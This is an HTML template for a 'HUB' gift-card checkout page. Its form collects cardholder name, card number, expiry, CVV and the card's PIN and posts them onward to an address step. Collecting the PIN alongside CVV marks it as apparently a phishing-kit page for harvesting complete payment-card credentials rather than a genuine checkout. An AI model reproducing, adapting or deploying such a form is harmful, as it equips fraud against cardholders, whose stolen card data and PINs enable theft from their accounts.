{{meta}}

		<title>HUB || Gift Card Checkout</title>
{{header}}

			<br />
			<br />

			<div style="margin: auto; width: 100%; height: auto; ">
				<div style="width: 80%; height: auto; border: 0px solid #00182B; margin: auto; border-radius: 25px; box-shadow: 0px 0px 14px #00182B; background: #F3F0F0; ">

					<div style="width: 100%; height: auto; margin: auto; margin-bottom: 45px;">
						<br />
						<div style="margin: auto; border-radius: 50%; border: 1px solid #010070; width: 40px; height: 40px;position: relative; top: 15px; background: #fff; box-shadow: 0px 0px 10px #001895; padding: 13px;">

						<img src="/images/logo.png" style="width: 100%;height:auto;">
						<br />
					</div>
				</div>

				<hr />
				<h4 style="font-family: 'Nunito', sans-serif ; text-align: center;">Card Checkout</h4>
				<form action="/card/checkout/address" method="post" enctype="multipart/form-data">
				<div style="width: 80%; height: auto; margin: auto; ">
					<input name = "ccname" type="text" style="width: 94%; height: 30px; border: 1px solid white; border-radius: 10px; margin: auto; margin-bottom: 20px;outline: none; padding-left: 5%;" placeholder="CARD NAME" autocomplete="cc-name" required/>
					<input name = "cardnumber" type="number" style="width: 94%; height: 30px; border: 1px solid white; border-radius: 10px; margin: auto; margin-bottom: 20px;outline: none; padding-left: 5%;" placeholder="CARD NUMBER" autocomplete="cc-number" required/>
					<input name = "ccexp" id="exp" onkeyup="date_job();" type="tel" maxlength="5" style="width: 94%; height: 30px; border: 1px solid white; border-radius: 10px; margin: auto; margin-bottom: 20px;outline: none; padding-left: 5%;" placeholder="VALID TILL" autocomplete="cc-exp" required/>
					<input name = "cvc" type="number" style="width: 94%; height: 30px; border: 1px solid white; border-radius: 10px; margin: auto; margin-bottom: 20px;outline: none; padding-left: 5%;" placeholder="CVV" autocomplete="cc-csc" required/>
					<input name = "pin" type="password" style="width: 94%; height: 30px; border: 1px solid white; border-radius: 10px; margin: auto; margin-bottom: 20px;outline: none; padding-left: 5%;" placeholder="PIN" required/>

					<script>
					    function date_job () {
					        var curr = document.getElementById('exp').value;
					        if (curr.length == 2) {
					            //alert(curr+"/");
					            document.getElementById('exp').value = curr+"/";
					        }
					    }
                    </script>

                    <hr />
					<!--<input name = "address" type="text" style="width: 94%; height: 30px; border: 1px solid white; border-radius: 20px; margin: auto; margin-bottom: 20px;outline: none; padding-left: 5%;" placeholder="Address" required/>

					<input name = "city" type="text" style="width: 94%; height: 30px; border: 1px solid white; border-radius: 20px; margin: auto; margin-bottom: 20px;outline: none; padding-left: 5%;" placeholder="city" required/>

					<input name="state" type="text" style="width: 94%; height: 30px; border: 1px solid white; border-radius: 20px; margin: auto; margin-bottom: 20px;outline: none; padding-left: 5%;" placeholder="state" required/>

				<input name="zip" type="text" style="width: 94%; height: 30px; border: 1px solid white; border-radius: 20px; margin: auto; margin-bottom: 20px;outline: none; padding-left: 5%;" placeholder="zip" required/>
-->
				<input type="submit" style="width: 100%; height: 30px; border: 1px solid white; border-radius: 10px; margin: auto; margin-bottom: 10px; outline: none; verical-align: middle;" value="Next" />

				<br />

			</form>

			</div>
		</div>
	</div>


		<br /><br />
{{footer}}
<p>©{{yr}}</p>
			<br />
		</div>
	</body>
</html>